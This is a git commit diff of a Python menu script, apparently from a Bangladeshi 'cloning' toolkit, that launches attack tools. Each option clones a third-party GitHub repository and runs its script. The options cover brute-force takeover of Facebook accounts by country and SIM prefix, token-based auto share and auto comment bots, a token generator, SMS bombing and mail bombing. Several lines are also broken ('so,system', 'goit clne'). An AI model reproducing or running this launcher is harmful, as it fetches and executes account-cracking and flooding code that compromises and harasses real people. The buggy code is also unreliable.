22bd842115973ba0e1fae43b6b41135ff6ced073
34TV5TVCGGGGGGGGGGRESWE24354TGWSA <105362356+34TV5TVCGGGGGGGGGGRESWE24354TGWSA@users.noreply.github.com>
2022-06-04 22:24:36 +0600

    Update fm.py

--- fm.py
+++ fm.py
@@ -5,9 +5,11 @@ import os
 os.system('clear')
 os.system("pip install requests")
 os.system('clear')
-def menu():
+def Zeek():
     os.system('clear')
-
+    print (logo)
+    print (47 )* '\x1b[1;92m-' 
+    os.system('clear')
 print("""\33[93m███╗   ███╗ █████╗██╗  ██╗██████╗ ██╗     \n\033[91m███╗ ████║██╔══██╗██║  ██║██╔══██╗██║    \n\033[1;32m██╔████╔██║███████║███████║██║  ██║██║   \n\33[97m██║╚██╔╝██║██╔══██║██╔══██║██║  ██║██║    \n\033[96m██║ ╚═╝ ██║██║  ██║██║  ██║██████╔╝██║    \n\033[0;35m╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝\033[0m 
 \033[0m================================================================
 \33[93mAUTHOR :\033[91m[MAHDI HASAN] SHUVO
@@ -22,7 +24,6 @@ print("""
 \033[1;37m[1]CLONE BANGLADESH ID[fast]
 \033[1;32m[2]CLONE FROM BANGLADESH 6DIG[All SIM]
 \033[1;88m[3]CLONE FROM CLONE FROM ID BANGLADESH 9DIG (All SIM)
-\033[1;33m[4]CLONE FROM ID BANGLADESH 11DIG[All SIM]  
 \033[1;32m[5]CLONE FROM FREOM PAKISTAN
 \033[1;33m[6]CLONE FROM FROM INDIA
 \033[1;36m[7]CLONE FROM Thailand ID
@@ -40,7 +41,7 @@ print("""
 \033[1;37m[19]FB AUTO SHARE (need TOKEN)
 \033[1;33m[20]FB AUTO COMMENT(need TOKEN)
 
-                  \033[1;37mFRENDLIST CLONER
+                     \033[1;37mFRENDLIST CLONER
 \033[1;33m[21]CLONE FROM  PUBLICK ID  (Best)64 bid                  
 \033[1;36m[22]CLONE FROM  PUBLICK ID  (Best)64 bid
 \033[1;36m[23]CLONE FROM  PUBLICK ID  (best)64 bid
@@ -54,232 +55,226 @@ print("""
 \033[1;36m[29]SMS BOMBING BD NUMBER
 \033[1;32m[30]TAMPMAIL [MAO]
 \033[1;33m[31]MAIL BOMBIBG
-             NEW UPADATE
+                  NEW UPADATE
 \033[1;93m[32]CLONE FROM 2004- 2006 ID Best(need aproval)
 \033[1;93m[33]CLONE FROM 2004- 2006 ID Best(FREE)
+\033[1;33m[34]CLONE FROM ID BANGLADESH ALL DIG[All SIM]
 """)
 pil = input("\033[1;97m[\033[1;94m?\033[1;97m] CHOOSE: ")
 
 if pil in ["01", "1"]:
-    
-    os.system('git clone https://github.com/Shuvo-BBHH/mall')
-    os.system('cd mall && python2 RR_Premium.py')
-    time.sleep(2)
-    print(" ")
-    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
-    time.sleep(2)
+
+        os.system('git clone https://github.com/Shuvo-BBHH/mall')
+        os.system('cd mall && python2 RR_Premium.py')
+        time.sleep(2)
+        print(" ")
+        n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+        time.sleep(2)
 
 elif pil in ["02", "2"]:
-    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4')
-    os.system('cd paidfree4')
-    os.system('python2 BD6.py')
-    time.sleep(2)
-    print(" ")
-    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
-    time.sleep(2)
-    main()
+        os.system('git clone https://github.com/Shuvo-BBHH/paidfree4')
+        os.system('cd paidfree4')
+        os.system('python2 BD6.py')
+        time.sleep(2)
+        print(" ")
+        n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+        time.sleep(2)
+        Zeek()
+        
 
 elif pil in ["3"]:
-    os.system('git clone https://github.com/Shuvo-BBHH/shuvook.git && cd $HOME')
-    so,system('cd shuvook && python2 bd9.py')
-    time.sleep(2)
-    print(" ")
-    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
-    time.sleep(2)
+        os.system('git clone https://github.com/Shuvo-BBHH/shuvook.git && cd $HOME')
+        so,system('cd shuvook && python2 bd9.py')
+        time.sleep(2)
+        print(" ")
+        n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+        time.sleep(2)
 
 elif pil in ["04", "4"]:
-    os.system('git clone https://github.com/HackerYT0/BD-CLONER')
-    os.system('cd BD-CLONER')
-    os.system('python2 Bd-Cloner-1.py')
-    time.sleep(2)
-    print(" ")
-    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
-    time.sleep(2)
-    main()
+
+        os.system('git clone https://github.com/HackerYT0/BD-CLONER')
+        os.system('cd BD-CLONER')
+        os.system('python2 Bd-Cloner-1.py')
+        time.sleep(2)
+        print(" ")
+        n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+        time.sleep(2)
+        Zeek()
     
 
 elif pil in ["5"]:
-    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd $HOME')
-    os.system('cd paidfree4 && python2 pakistan.py')
-    time.sleep(2)
+        os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd $HOME')
+        os.system('cd paidfree4 && python2 pakistan.py')
+        time.sleep(2)
     
 elif pil in ["6"]:
-    os.system('pkg update ; pkg upgrade ; pkg install python ; pkg install python2 ; pip2 install requests ; pip2 install mechanize ; pip2 install bs4 ; pkg install git ; git clone https://github.com/Azim-vau/clone-india.git ; cd clone-india ; python2 india.py')
-    time.sleep(2)
-    print(" ")
-    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
-    time.sleep(2)   
+        os.system('pkg update ; pkg upgrade ; pkg install python ; pkg install python2 ; pip2 install requests ; pip2 install mechanize ; pip2 install bs4 ; pkg install git ; git clone https://github.com/Azim-vau/clone-india.git ; cd clone-india ; python2 india.py')
+        time.sleep(2)
+        print(" ")
+        n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+        time.sleep(2)   
     
 elif pil in ["7"]:
-    os.system('git clone https://github.com/Shuvo-BBHH/mall')
-    os.system('cd mall && python2 Thailand.py')
-    time.sleep(2)
-    print(" ")
-    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
-    time.sleep(2)
+        os.system('git clone https://github.com/Shuvo-BBHH/mall')
+        os.system('cd mall && python2 Thailand.py')
+        time.sleep(2)
+        print(" ")
+        n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+        time.sleep(2)
 
 
 elif pil in ["8"]:
-    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4')
-    os.system('cd paidfree4 && python2 Mahadi-Afg.py')
-    time.sleep(2)
-    print(" ")
-    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
-    time.sleep(2)
-    main()
+        os.system('git clone https://github.com/Shuvo-BBHH/paidfree4')
+        os.system('cd paidfree4 && python2 Mahadi-Afg.py')
+        time.sleep(2)
+        print(" ")
+        n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+        time.sleep(2)
+        Zeek()
     
 elif pil in ["9"]:
-     os.system('git clone https://github.com/Shuvo-BBHH/paidfree4')
-     os.system('cd paidfree4')
-     os.system('python mahdi2.py')
-     time.sleep(2)
+        os.system('git clone https://github.com/Shuvo-BBHH/paidfree4')
+        os.system('cd paidfree4')
+        os.system('python mahdi2.py')
+        time.sleep(2)
  
 elif pil in ["10"]:
-    os.system('git clone https://github.com/faizanwahla/pacman.git')
-    os.system('cd pacman && python2 bolt')
-    time.sleep(2)
-    print(" ")
-    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
-    time.sleep(2)
-    main()
+        os.system('git clone https://github.com/faizanwahla/pacman.git')
+        os.system('cd pacman && python2 bolt')
+        time.sleep(2)
+        print(" ")
+        n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+        time.sleep(2)
+        Zeek()
 	
 	
 elif pil in ["11"]:   
-    os.system('git clone http://github.com/nfs-tech-bd/NFS-ALL')
-    os.system('cd NFS-ALL && python2 NFS-ALL.py')
-    time.sleep(2)
-    print(" ")
-    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
-    time.sleep(2)	
+        os.system('git clone http://github.com/nfs-tech-bd/NFS-ALL')
+        os.system('cd NFS-ALL && python2 NFS-ALL.py')
+        time.sleep(2)
+        print(" ")
+        n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+        time.sleep(2)	
 elif pil in ["12"]:
-    os.system('pip2 install requests mechanize')
-    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4')
-    os.system('cd paidfree4')
-    os.system('python2 instragam.py')
-    time.sleep(2)
-    print(" ")
-    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
-    time.sleep(2)
-    main()
+        os.system('pip2 install requests mechanize')
+        os.system('git clone https://github.com/Shuvo-BBHH/paidfree4')
+        os.system('cd paidfree4')
+        os.system('python2 instragam.py')
+        time.sleep(2)
+        print(" ")
+        n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+        time.sleep(2)
+        Zeek()
+
+
+
     
 elif pil in ["13"]:
-    os.system('git clone https://github.com/Hannan-404/pro-1')
-    os.system('cd pro-1 && python pro.py')
-    time.sleep(2)
-    print(" ")
-    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
-    time.sleep(2)
-    main()
+        os.system('git clone https://github.com/Hannan-404/pro-1')
+        os.system('cd pro-1 && python pro.py')
+        time.sleep(2)
+        print(" ")
+        n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+        time.sleep(2)
+        Zeek()
 
 elif pil in ["14"]:
-    os.system('goit clne https://github.com/Shuvo-BBHH/texs')
-    os.system('cd texs && python2 xm.py')
-    time.sleep(2)
-    print(" ")
-    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
-    time.sleep(2)
-    main()
+        os.system('goit clne https://github.com/Shuvo-BBHH/texs')
+        os.system('cd texs && python2 xm.py')
+        time.sleep(2)
+    
 elif pil in ["15"]:
-    os.system('git clone https://github.com/Shuvo-BBHH/texs')	
-    os.system('cd texs && python yahoo.py')
+        os.system('git clone https://github.com/Shuvo-BBHH/texs')	
+        os.system('cd texs && python yahoo.py')
 
 elif pil in ["16"]:
-    os.system('git clone https://github.com/Shuvo-BBHH/texs')
-    os.system('cd texs && python2 santo.py')
-    time.sleep(2)   
+        os.system('git clone https://github.com/Shuvo-BBHH/texs')
+        os.system('cd texs && python2 santo.py')
+        time.sleep(2)   
 
 elif pil in ["17"]:
-    os.system('pip2 install mclone')
-    os.system('mclone')
-    time.sleep(2)
-    print(" ")
-    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
-    time.sleep(2)
+        os.system('pip2 install mclone')
+        os.system('mclone')
+    
 elif pil in ["18"]:
-    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4')
-    os.system('cd paidfree4 && python 20091st.py')
-    time.sleep(2)
-    print(" ")
-    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
-    time.sleep(2)
+        os.system('git clone https://github.com/Shuvo-BBHH/paidfree4')
+        os.system('cd paidfree4 && python 20091st.py')
+        time.sleep(2)
+    
 elif pil in ["19"]:
-    os.system('git clone https://github.com/Shuvo-BBHH/fbboT')
-    os.system('cd fbboT && python mahdi.py')
+        os.system('git clone https://github.com/Shuvo-BBHH/fbboT')
+        os.system('cd fbboT && python mahdi.py')
 
 elif pil in ["20"]:
-    os.system('git clone https://github.com/Shuvo-BBHH/fbboT')
-    os.system('cd fbboT && python autocomment.py')
+        os.system('git clone https://github.com/Shuvo-BBHH/fbboT')
+        os.system('cd fbboT && python autocomment.py')
 	
 
 elif pil in ["21"]:
-    os.system('git clone https://github.com/Hannan-404/ADF')
-    so.system('cd ADF && python ADF.py')
-    time.sleep(2)
-    print(" ")
-    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
-    time.sleep(2)	
+        os.system('git clone https://github.com/Hannan-404/ADF')
+        so.system('cd ADF && python ADF.py')
+    	
 
 elif pil in ["22"]:
-    os.system('git clone https://github.com/Shuvo-BBHH/mall')
-    os.system('cd mall && python Zahid.py')
-    time.sleep(2)
-    print(" ")
-    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
-    time.sleep(2)
+        os.system('git clone https://github.com/Shuvo-BBHH/mall')
+        os.system('cd mall && python Zahid.py')
+        
+    
 	
 elif pil in ["23"]:
-    os.system('git clone https://github.com/Shuvo-BBHH/mall')
-    os.system('cd mall && python fcpromax.py')
-    time.sleep(2)
-    print(" ")
-    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
-    time.sleep(2)	
+        os.system('git clone https://github.com/Shuvo-BBHH/mall')
+        os.system('cd mall && python fcpromax.py')
+    	
 elif pil in ["24"]:
-    os.system('git clone https://github.com/Shuvo-BBHH/mall')
-    os.system('cd mall && python2 file.py')
-    time.sleep(2)
-    print(" ")
-    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
-    time.sleep(2)
+        os.system('git clone https://github.com/Shuvo-BBHH/mall')
+        os.system('cd mall && python2 file.py')
+    
 elif pil in ["25"]:
-    os.system('git clone https://github.com/HANNAN0098/Token-Gen')
-    os.system('cd Token-Gen && python2 Genrate.py')
-    time.sleep(2)
+        os.system('git clone https://github.com/HANNAN0098/Token-Gen')
+        os.system('cd Token-Gen && python2 Genrate.py')
+     
 
 
 elif pil in ["26"]:
-    os.system('git clone https://github.com/Shuvo-BBHH/mall')
-    os.system('cd mall && python3 okk.py')
-    time.sleep(2)
+        os.system('git clone https://github.com/Shuvo-BBHH/mall')
+        os.system('cd mall && python3 okk.py')
+        
 
 elif pil in ["27"]:
-    os.system('git clone https://github.com/Shuvo-BBHH/mall')
-    os.system('cd mall && python number.py')
+        os.system('git clone https://github.com/Shuvo-BBHH/mall')
+        os.system('cd mall && python number.py')
 
 elif pil in ["28"]:
-    os.system('rm -rf RamXan')
-    os.system('git clone https://github.com/ramzantanha/RamXan')
-    os.system('cd RamXan && python RamXan.py')
+        os.system('rm -rf RamXan')
+        os.system('git clone https://github.com/ramzantanha/RamXan')
+        os.system('cd RamXan && python RamXan.py')
        
 elif pil in ["29"]:
-    os.system('git clone https://github.com/Toxic-Noob/ToxicBomber')
-    os.system('cd ToxicBomber && python Tbomb.py')
-    time.sleep(2)
+        os.system('git clone https://github.com/Toxic-Noob/ToxicBomber')
+        os.system('cd ToxicBomber && python Tbomb.py')
+       
 
 elif pil in ["30"]:
-    os.system('apt update -y ; apt install python -y ; apt install git -y ; pip install requests ; git clone https://github.com/mao2116/mmail')
-    os.system('cd mmail && python mmail.py')
-    time.sleep(2)
+        os.system('apt update -y ; apt install python -y ; apt install git -y ; pip install requests ; git clone https://github.com/mao2116/mmail')
+        os.system('cd mmail && python mmail.py')
+     
 elif pil in ["31"]:
-    os.system('git clone https://github.com/Toxic-Noob/EmailTools')
-    os.system('cd EmailTools')
-    os.system('pip install -r requirements.txt')
-    os.system('python e-tools.py')
-    time.sleep(2)
+        os.system('git clone https://github.com/Toxic-Noob/EmailTools')
+        os.system('cd EmailTools')
+        os.system('pip install -r requirements.txt')
+        os.system('python e-tools.py')
+     
 elif pil in ["32"]:
-    os.system('git clone https://github.com/MAHDI-Shuvo/1')
-    os.system('cd 1')
-    os.system('python2 mahdi.py')
-    time.sleep(2)
-                         
-                         
+        os.system('git clone https://github.com/MAHDI-Shuvo/1')
+        os.system('cd 1')
+        os.system('python2 mahdi.py')
+    
+elif pil in ["33"]:
+        os.system('git clone https://github.com/Shuvo-BBHH/taw')
+        os.system('cd taw')
+        os.system('python2 mh.py')
+     
+elif pil in ["34"]:
+        os.system('git clone https://github.com/MAHDI-Shuvo/tansbdall')
+        os.system('cd tansbdall')
+        os.system('python main.py')
